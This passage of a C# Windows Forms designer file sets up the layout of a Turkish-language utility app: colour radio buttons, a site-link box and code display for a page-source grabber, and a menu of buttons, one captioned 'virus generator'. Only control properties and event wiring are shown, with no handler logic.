            this.recuperareIIButton27.Click += new System.EventHandler(this.RecuperareIIButton27_Click);
            // 
            // recuperareIIButton26
            // 
            this.recuperareIIButton26.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton26.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton26.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton26.Location = new System.Drawing.Point(20, 52);
            this.recuperareIIButton26.Name = "recuperareIIButton26";
            this.recuperareIIButton26.Size = new System.Drawing.Size(415, 41);
            this.recuperareIIButton26.TabIndex = 29;
            this.recuperareIIButton26.Text = "AYARLAR";
            this.recuperareIIButton26.Click += new System.EventHandler(this.RecuperareIIButton26_Click);
            // 
            // panel50
            // 
            this.panel50.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel50.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel50.Location = new System.Drawing.Point(10, 58);
            this.panel50.Name = "panel50";
            this.panel50.Size = new System.Drawing.Size(62, 10);
            this.panel50.TabIndex = 7;
            // 
            // panel49
            // 
            this.panel49.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel49.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel49.Location = new System.Drawing.Point(72, 36);
            this.panel49.Name = "panel49";
            this.panel49.Size = new System.Drawing.Size(10, 32);
            this.panel49.TabIndex = 6;
            // 
            // panel48
            // 
            this.panel48.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel48.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel48.Location = new System.Drawing.Point(0, 36);
            this.panel48.Name = "panel48";
            this.panel48.Size = new System.Drawing.Size(10, 32);
            this.panel48.TabIndex = 5;
            // 
            // panel47
            // 
            this.panel47.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel47.Controls.Add(this.label63);
            this.panel47.Controls.Add(this.button10);
            this.panel47.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel47.Location = new System.Drawing.Point(0, 0);
            this.panel47.Name = "panel47";
            this.panel47.Size = new System.Drawing.Size(82, 36);
            this.panel47.TabIndex = 4;
            this.panel47.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel47_MouseDown);
            this.panel47.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel47_MouseMove);
            this.panel47.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel47_MouseUp);
            // 
            // label63
            // 
            this.label63.AutoSize = true;
            this.label63.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label63.ForeColor = System.Drawing.Color.White;
            this.label63.Location = new System.Drawing.Point(165, 10);
            this.label63.Name = "label63";
            this.label63.Size = new System.Drawing.Size(140, 17);
            this.label63.TabIndex = 12;
            this.label63.Text = "< TÜM ÖZELLİKLER >";
            // 
            // button10
            // 
            this.button10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button10.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button10.ForeColor = System.Drawing.Color.White;
            this.button10.Location = new System.Drawing.Point(420, 7);
            this.button10.Name = "button10";
            this.button10.Size = new System.Drawing.Size(23, 22);
            this.button10.TabIndex = 4;
            this.button10.Text = "X";
            this.button10.UseVisualStyleBackColor = false;
            this.button10.Click += new System.EventHandler(this.Button10_Click);
            // 
            // panel51
            // 
            this.panel51.Controls.Add(this.iTalk_GroupBox21);
            this.panel51.Controls.Add(this.iTalk_GroupBox20);
            this.panel51.Controls.Add(this.panel55);
            this.panel51.Controls.Add(this.panel54);
            this.panel51.Controls.Add(this.panel53);
            this.panel51.Controls.Add(this.panel52);
            this.panel51.Location = new System.Drawing.Point(415, 229);
            this.panel51.Name = "panel51";
            this.panel51.Size = new System.Drawing.Size(109, 68);
            this.panel51.TabIndex = 29;
            // 
            // iTalk_GroupBox21
            // 
            this.iTalk_GroupBox21.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox21.Controls.Add(this.richTextBox1);
            this.iTalk_GroupBox21.Location = new System.Drawing.Point(17, 168);
            this.iTalk_GroupBox21.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox21.Name = "iTalk_GroupBox21";
            this.iTalk_GroupBox21.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox21.Size = new System.Drawing.Size(830, 368);
            this.iTalk_GroupBox21.TabIndex = 10;
            this.iTalk_GroupBox21.Text = "KOD EKRANI";
            // 
            // richTextBox1
            // 
            this.richTextBox1.BackColor = System.Drawing.SystemColors.WindowText;
            this.richTextBox1.ForeColor = System.Drawing.Color.Yellow;
            this.richTextBox1.Location = new System.Drawing.Point(8, 30);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new System.Drawing.Size(812, 330);
            this.richTextBox1.TabIndex = 0;
            this.richTextBox1.Text = "";
            // 
            // iTalk_GroupBox20
            // 
            this.iTalk_GroupBox20.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox20.Controls.Add(this.effectualRadioButton6);
            this.iTalk_GroupBox20.Controls.Add(this.label66);
            this.iTalk_GroupBox20.Controls.Add(this.effectualRadioButton5);
            this.iTalk_GroupBox20.Controls.Add(this.monoFlat_Button26);
            this.iTalk_GroupBox20.Controls.Add(this.effectualRadioButton4);
            this.iTalk_GroupBox20.Controls.Add(this.effectualRadioButton3);
            this.iTalk_GroupBox20.Controls.Add(this.effectualRadioButton2);
            this.iTalk_GroupBox20.Controls.Add(this.effectualRadioButton1);
            this.iTalk_GroupBox20.Controls.Add(this.monoFlat_Button25);
            this.iTalk_GroupBox20.Controls.Add(this.ambiance_TextBox2);
            this.iTalk_GroupBox20.Controls.Add(this.monoFlat_Button24);
            this.iTalk_GroupBox20.Controls.Add(this.label65);
            this.iTalk_GroupBox20.Location = new System.Drawing.Point(17, 47);
            this.iTalk_GroupBox20.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox20.Name = "iTalk_GroupBox20";
            this.iTalk_GroupBox20.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox20.Size = new System.Drawing.Size(830, 115);
            this.iTalk_GroupBox20.TabIndex = 9;
            this.iTalk_GroupBox20.Text = "AYARLAR";
            this.iTalk_GroupBox20.Click += new System.EventHandler(this.İTalk_GroupBox20_Click);
            // 
            // effectualRadioButton6
            // 
            this.effectualRadioButton6.BackColor = System.Drawing.Color.Transparent;
            this.effectualRadioButton6.Checked = false;
            this.effectualRadioButton6.ForeColor = System.Drawing.Color.BlanchedAlmond;
            this.effectualRadioButton6.Location = new System.Drawing.Point(482, 84);
            this.effectualRadioButton6.Name = "effectualRadioButton6";
            this.effectualRadioButton6.Size = new System.Drawing.Size(94, 16);
            this.effectualRadioButton6.TabIndex = 25;
            this.effectualRadioButton6.Text = "AÇIK MAVİ";
            this.effectualRadioButton6.CheckedChanged += new EffectualRadioButton.CheckedChangedEventHandler(this.EffectualRadioButton6_CheckedChanged);
            // 
            // label66
            // 
            this.label66.AutoSize = true;
            this.label66.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label66.Location = new System.Drawing.Point(8, 83);
            this.label66.Name = "label66";
            this.label66.Size = new System.Drawing.Size(135, 17);
            this.label66.TabIndex = 24;
            this.label66.Text = "KOD EKRANI RENGİ :";
            // 
            // effectualRadioButton5
            // 
            this.effectualRadioButton5.BackColor = System.Drawing.Color.Transparent;
            this.effectualRadioButton5.Checked = false;
            this.effectualRadioButton5.ForeColor = System.Drawing.Color.Black;
            this.effectualRadioButton5.Location = new System.Drawing.Point(419, 84);
            this.effectualRadioButton5.Name = "effectualRadioButton5";
            this.effectualRadioButton5.Size = new System.Drawing.Size(68, 16);
            this.effectualRadioButton5.TabIndex = 23;
            this.effectualRadioButton5.Text = "MAVİ";
            this.effectualRadioButton5.CheckedChanged += new EffectualRadioButton.CheckedChangedEventHandler(this.EffectualRadioButton5_CheckedChanged);
            // 
            // monoFlat_Button26
            // 
            this.monoFlat_Button26.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button26.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button26.Image = null;
            this.monoFlat_Button26.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button26.Location = new System.Drawing.Point(620, 75);
            this.monoFlat_Button26.Name = "monoFlat_Button26";
            this.monoFlat_Button26.Size = new System.Drawing.Size(203, 28);
            this.monoFlat_Button26.TabIndex = 22;
            this.monoFlat_Button26.Text = "HTML OLARAK KAYDET";
            this.monoFlat_Button26.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button26.Click += new System.EventHandler(this.MonoFlat_Button26_Click);
            // 
            // effectualRadioButton4
            // 
            this.effectualRadioButton4.BackColor = System.Drawing.Color.Transparent;
            this.effectualRadioButton4.Checked = false;
            this.effectualRadioButton4.ForeColor = System.Drawing.Color.Black;
            this.effectualRadioButton4.Location = new System.Drawing.Point(339, 84);
            this.effectualRadioButton4.Name = "effectualRadioButton4";
            this.effectualRadioButton4.Size = new System.Drawing.Size(68, 16);
            this.effectualRadioButton4.TabIndex = 21;
            this.effectualRadioButton4.Text = "KIRMIZI";
            this.effectualRadioButton4.CheckedChanged += new EffectualRadioButton.CheckedChangedEventHandler(this.EffectualRadioButton4_CheckedChanged);
            // 
            // effectualRadioButton3
            // 
            this.effectualRadioButton3.BackColor = System.Drawing.Color.Transparent;
            this.effectualRadioButton3.Checked = false;
            this.effectualRadioButton3.ForeColor = System.Drawing.Color.Black;
            this.effectualRadioButton3.Location = new System.Drawing.Point(270, 84);
            this.effectualRadioButton3.Name = "effectualRadioButton3";
            this.effectualRadioButton3.Size = new System.Drawing.Size(68, 16);
            this.effectualRadioButton3.TabIndex = 20;
            this.effectualRadioButton3.Text = "YEŞİL";
            this.effectualRadioButton3.CheckedChanged += new EffectualRadioButton.CheckedChangedEventHandler(this.EffectualRadioButton3_CheckedChanged);
            // 
            // effectualRadioButton2
            // 
            this.effectualRadioButton2.BackColor = System.Drawing.Color.Transparent;
            this.effectualRadioButton2.Checked = false;
            this.effectualRadioButton2.ForeColor = System.Drawing.Color.Black;
            this.effectualRadioButton2.Location = new System.Drawing.Point(214, 84);
            this.effectualRadioButton2.Name = "effectualRadioButton2";
            this.effectualRadioButton2.Size = new System.Drawing.Size(68, 16);
            this.effectualRadioButton2.TabIndex = 19;
            this.effectualRadioButton2.Text = "SARI";
            this.effectualRadioButton2.CheckedChanged += new EffectualRadioButton.CheckedChangedEventHandler(this.EffectualRadioButton2_CheckedChanged);
            // 
            // effectualRadioButton1
            // 
            this.effectualRadioButton1.BackColor = System.Drawing.Color.Transparent;
            this.effectualRadioButton1.Checked = false;
            this.effectualRadioButton1.ForeColor = System.Drawing.Color.Black;
            this.effectualRadioButton1.Location = new System.Drawing.Point(145, 84);
            this.effectualRadioButton1.Name = "effectualRadioButton1";
            this.effectualRadioButton1.Size = new System.Drawing.Size(68, 16);
            this.effectualRadioButton1.TabIndex = 18;
            this.effectualRadioButton1.Text = "BEYAZ";
            this.effectualRadioButton1.CheckedChanged += new EffectualRadioButton.CheckedChangedEventHandler(this.EffectualRadioButton1_CheckedChanged);
            // 
            // monoFlat_Button25
            // 
            this.monoFlat_Button25.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button25.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button25.Image = null;
            this.monoFlat_Button25.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button25.Location = new System.Drawing.Point(724, 36);
            this.monoFlat_Button25.Name = "monoFlat_Button25";
            this.monoFlat_Button25.Size = new System.Drawing.Size(98, 28);
            this.monoFlat_Button25.TabIndex = 11;
            this.monoFlat_Button25.Text = "TEMİZLE";
            this.monoFlat_Button25.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button25.Click += new System.EventHandler(this.MonoFlat_Button25_Click);
            // 
            // ambiance_TextBox2
            // 
            this.ambiance_TextBox2.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_TextBox2.Font = new System.Drawing.Font("Tahoma", 11F);
            this.ambiance_TextBox2.ForeColor = System.Drawing.Color.DimGray;
            this.ambiance_TextBox2.Location = new System.Drawing.Point(83, 36);
            this.ambiance_TextBox2.MaxLength = 32767;
            this.ambiance_TextBox2.Multiline = false;
            this.ambiance_TextBox2.Name = "ambiance_TextBox2";
            this.ambiance_TextBox2.ReadOnly = false;
            this.ambiance_TextBox2.Size = new System.Drawing.Size(531, 28);
            this.ambiance_TextBox2.TabIndex = 17;
            this.ambiance_TextBox2.Text = "ÇRNEK//  http://www.google.com/  şeklinde yazın";
            this.ambiance_TextBox2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.ambiance_TextBox2.UseSystemPasswordChar = false;
            // 
            // monoFlat_Button24
            // 
            this.monoFlat_Button24.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button24.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button24.Image = null;
            this.monoFlat_Button24.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button24.Location = new System.Drawing.Point(620, 36);
            this.monoFlat_Button24.Name = "monoFlat_Button24";
            this.monoFlat_Button24.Size = new System.Drawing.Size(98, 28);
            this.monoFlat_Button24.TabIndex = 10;
            this.monoFlat_Button24.Text = "İNDEX ÇEK";
            this.monoFlat_Button24.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button24.Click += new System.EventHandler(this.MonoFlat_Button24_Click);
            // 
            // label65
            // 
            this.label65.AutoSize = true;
            this.label65.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label65.Location = new System.Drawing.Point(8, 42);
            this.label65.Name = "label65";
            this.label65.Size = new System.Drawing.Size(74, 17);
            this.label65.TabIndex = 16;
            this.label65.Text = "SİTE LİNK :";
            // 
            // panel55
            // 
            this.panel55.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel55.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel55.Location = new System.Drawing.Point(10, 58);
            this.panel55.Name = "panel55";
            this.panel55.Size = new System.Drawing.Size(89, 10);
            this.panel55.TabIndex = 8;
            // 
            // panel54
            // 
            this.panel54.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel54.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel54.Location = new System.Drawing.Point(99, 36);
            this.panel54.Name = "panel54";
            this.panel54.Size = new System.Drawing.Size(10, 32);
            this.panel54.TabIndex = 7;
            // 
            // panel53
            // 
            this.panel53.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel53.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel53.Location = new System.Drawing.Point(0, 36);
            this.panel53.Name = "panel53";
            this.panel53.Size = new System.Drawing.Size(10, 32);
            this.panel53.TabIndex = 6;
            // 
            // panel52
            // 
            this.panel52.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel52.Controls.Add(this.label64);
            this.panel52.Controls.Add(this.button15);
            this.panel52.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel52.Location = new System.Drawing.Point(0, 0);
            this.panel52.Name = "panel52";
            this.panel52.Size = new System.Drawing.Size(109, 36);
            this.panel52.TabIndex = 5;
            this.panel52.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel52_MouseDown);
            this.panel52.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel52_MouseMove);
            this.panel52.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel52_MouseUp);
            // 
            // label64
            // 
            this.label64.AutoSize = true;
            this.label64.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label64.ForeColor = System.Drawing.Color.White;
            this.label64.Location = new System.Drawing.Point(363, 10);
            this.label64.Name = "label64";
            this.label64.Size = new System.Drawing.Size(149, 17);
            this.label64.TabIndex = 12;
            this.label64.Text = "< İNDEX KOD ÇALICI >";
            // 
            // button15
            // 
            this.button15.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button15.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button15.ForeColor = System.Drawing.Color.White;
            this.button15.Location = new System.Drawing.Point(829, 6);
            this.button15.Name = "button15";
            this.button15.Size = new System.Drawing.Size(23, 22);
            this.button15.TabIndex = 4;
            this.button15.Text = "X";
            this.button15.UseVisualStyleBackColor = false;
            this.button15.Click += new System.EventHandler(this.Button15_Click);
            // 
            // label67
            // 
            this.label67.AutoSize = true;
            this.label67.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label67.Location = new System.Drawing.Point(13, 735);
            this.label67.Name = "label67";
            this.label67.Size = new System.Drawing.Size(79, 17);
            this.label67.TabIndex = 31;
            this.label67.Text = "İndex Çalıcı";
            // 
            // pictureBox27
            // 
            this.pictureBox27.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox27.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox27.Image")));
            this.pictureBox27.Location = new System.Drawing.Point(30, 676);
            this.pictureBox27.Name = "pictureBox27";
            this.pictureBox27.Size = new System.Drawing.Size(53, 52);
            this.pictureBox27.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox27.TabIndex = 30;
            this.pictureBox27.TabStop = false;
            this.pictureBox27.Click += new System.EventHandler(this.PictureBox27_Click);
            // 
            // panel56
            // 
            this.panel56.Controls.Add(this.iTalk_GroupBox22);
            this.panel56.Controls.Add(this.panel60);
            this.panel56.Controls.Add(this.panel59);
            this.panel56.Controls.Add(this.panel58);
            this.panel56.Controls.Add(this.panel57);
            this.panel56.Location = new System.Drawing.Point(683, 327);
            this.panel56.Name = "panel56";
            this.panel56.Size = new System.Drawing.Size(106, 69);
            this.panel56.TabIndex = 32;
            // 
            // iTalk_GroupBox22
            // 
            this.iTalk_GroupBox22.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox22.Controls.Add(this.label95);
            this.iTalk_GroupBox22.Controls.Add(this.label78);
            this.iTalk_GroupBox22.Controls.Add(this.label76);
            this.iTalk_GroupBox22.Controls.Add(this.label77);
            this.iTalk_GroupBox22.Controls.Add(this.label70);
            this.iTalk_GroupBox22.Controls.Add(this.label71);
            this.iTalk_GroupBox22.Controls.Add(this.label72);
            this.iTalk_GroupBox22.Controls.Add(this.label73);
            this.iTalk_GroupBox22.Controls.Add(this.label74);
            this.iTalk_GroupBox22.Controls.Add(this.label75);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue22);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue21);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue20);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue18);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue19);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue17);
            this.iTalk_GroupBox22.Controls.Add(this.label69);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue16);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue15);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue14);
            this.iTalk_GroupBox22.Controls.Add(this.effectualButtonBlue13);
            this.iTalk_GroupBox22.Location = new System.Drawing.Point(16, 40);
            this.iTalk_GroupBox22.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox22.Name = "iTalk_GroupBox22";
            this.iTalk_GroupBox22.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox22.Size = new System.Drawing.Size(392, 471);
            this.iTalk_GroupBox22.TabIndex = 11;
            this.iTalk_GroupBox22.Text = "AÇIK PROGRAMLAR AKTİFDİR";
            // 
            // label95
            // 
            this.label95.AutoSize = true;
            this.label95.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label95.Location = new System.Drawing.Point(70, 446);
            this.label95.Name = "label95";
            this.label95.Size = new System.Drawing.Size(257, 17);
            this.label95.TabIndex = 47;
            this.label95.Text = "ARKAPLAN DA ÇALIŞAN UYGULAMALAR";
            // 
            // label78
            // 
            this.label78.AutoSize = true;
            this.label78.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label78.Location = new System.Drawing.Point(268, 124);
            this.label78.Name = "label78";
            this.label78.Size = new System.Drawing.Size(98, 17);
            this.label78.TabIndex = 40;
            this.label78.Text = "/AKTİF/KAPAT";
            this.label78.Visible = false;
            // 
            // label76
            // 
            this.label76.AutoSize = true;
            this.label76.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label76.Location = new System.Drawing.Point(268, 161);
            this.label76.Name = "label76";
            this.label76.Size = new System.Drawing.Size(98, 17);
            this.label76.TabIndex = 34;
            this.label76.Text = "/AKTİF/KAPAT";
            this.label76.Visible = false;
            // 
            // label77
            // 
            this.label77.AutoSize = true;
            this.label77.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label77.Location = new System.Drawing.Point(268, 209);
            this.label77.Name = "label77";
            this.label77.Size = new System.Drawing.Size(98, 17);
            this.label77.TabIndex = 35;
            this.label77.Text = "/AKTİF/KAPAT";
            this.label77.Visible = false;
            // 
            // label70
            // 
            this.label70.AutoSize = true;
            this.label70.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label70.Location = new System.Drawing.Point(268, 249);
            this.label70.Name = "label70";
            this.label70.Size = new System.Drawing.Size(98, 17);
            this.label70.TabIndex = 34;
            this.label70.Text = "/AKTİF/KAPAT";
            this.label70.Visible = false;
            // 
            // label71
            // 
            this.label71.AutoSize = true;
            this.label71.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label71.Location = new System.Drawing.Point(268, 293);
            this.label71.Name = "label71";
            this.label71.Size = new System.Drawing.Size(98, 17);
            this.label71.TabIndex = 35;
            this.label71.Text = "/AKTİF/KAPAT";
            this.label71.Visible = false;
            // 
            // label72
            // 
            this.label72.AutoSize = true;
            this.label72.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label72.Location = new System.Drawing.Point(268, 335);
            this.label72.Name = "label72";
            this.label72.Size = new System.Drawing.Size(98, 17);
            this.label72.TabIndex = 36;
            this.label72.Text = "/AKTİF/KAPAT";
            this.label72.Visible = false;
            // 
            // label73
            // 
            this.label73.AutoSize = true;
            this.label73.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label73.Location = new System.Drawing.Point(268, 376);
            this.label73.Name = "label73";
            this.label73.Size = new System.Drawing.Size(98, 17);
            this.label73.TabIndex = 37;
            this.label73.Text = "/AKTİF/KAPAT";
            this.label73.Visible = false;
            this.label73.Click += new System.EventHandler(this.Label73_Click);
            // 
            // label74
            // 
            this.label74.AutoSize = true;
            this.label74.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label74.Location = new System.Drawing.Point(268, 418);
            this.label74.Name = "label74";
            this.label74.Size = new System.Drawing.Size(98, 17);
            this.label74.TabIndex = 38;
            this.label74.Text = "/AKTİF/KAPAT";
            this.label74.Visible = false;
            // 
            // label75
            // 
            this.label75.AutoSize = true;
            this.label75.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label75.Location = new System.Drawing.Point(268, 81);
            this.label75.Name = "label75";
            this.label75.Size = new System.Drawing.Size(98, 17);
            this.label75.TabIndex = 39;
            this.label75.Text = "/AKTİF/KAPAT";
            this.label75.Visible = false;
            // 
            // effectualButtonBlue22
            // 
            this.effectualButtonBlue22.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue22.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue22.Location = new System.Drawing.Point(11, 407);
            this.effectualButtonBlue22.Name = "effectualButtonBlue22";
            this.effectualButtonBlue22.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue22.TabIndex = 13;
            this.effectualButtonBlue22.Text = "VİRÜS ÜRETİCİ";
            this.effectualButtonBlue22.Click += new System.EventHandler(this.EffectualButtonBlue22_Click);
            // 
            // effectualButtonBlue21
            // 
            this.effectualButtonBlue21.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue21.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue21.Location = new System.Drawing.Point(11, 364);
            this.effectualButtonBlue21.Name = "effectualButtonBlue21";
            this.effectualButtonBlue21.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue21.TabIndex = 12;
            this.effectualButtonBlue21.Text = "AYARLAR";
            this.effectualButtonBlue21.Click += new System.EventHandler(this.EffectualButtonBlue21_Click);
            // 
            // effectualButtonBlue20
            // 
            this.effectualButtonBlue20.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue20.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue20.Location = new System.Drawing.Point(11, 323);
            this.effectualButtonBlue20.Name = "effectualButtonBlue20";
            this.effectualButtonBlue20.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue20.TabIndex = 11;
            this.effectualButtonBlue20.Text = "TÜM ÖZELLLİKLER";
            this.effectualButtonBlue20.Click += new System.EventHandler(this.EffectualButtonBlue20_Click);
            // 
            // effectualButtonBlue18
            // 
            this.effectualButtonBlue18.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue18.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue18.Location = new System.Drawing.Point(11, 238);
            this.effectualButtonBlue18.Name = "effectualButtonBlue18";
            this.effectualButtonBlue18.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue18.TabIndex = 9;
            this.effectualButtonBlue18.Text = "WEB BROWSER";
            this.effectualButtonBlue18.Click += new System.EventHandler(this.EffectualButtonBlue18_Click);
            // 
            // effectualButtonBlue19
            // 
            this.effectualButtonBlue19.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue19.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue19.Location = new System.Drawing.Point(11, 281);
            this.effectualButtonBlue19.Name = "effectualButtonBlue19";
            this.effectualButtonBlue19.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue19.TabIndex = 10;
            this.effectualButtonBlue19.Text = "İNDEX KOD ÇALICI";
            this.effectualButtonBlue19.Click += new System.EventHandler(this.EffectualButtonBlue19_Click);
            // 
            // effectualButtonBlue17
            // 
            this.effectualButtonBlue17.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue17.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue17.Location = new System.Drawing.Point(11, 196);
            this.effectualButtonBlue17.Name = "effectualButtonBlue17";
            this.effectualButtonBlue17.Size = new System.Drawing.Size(369, 33);
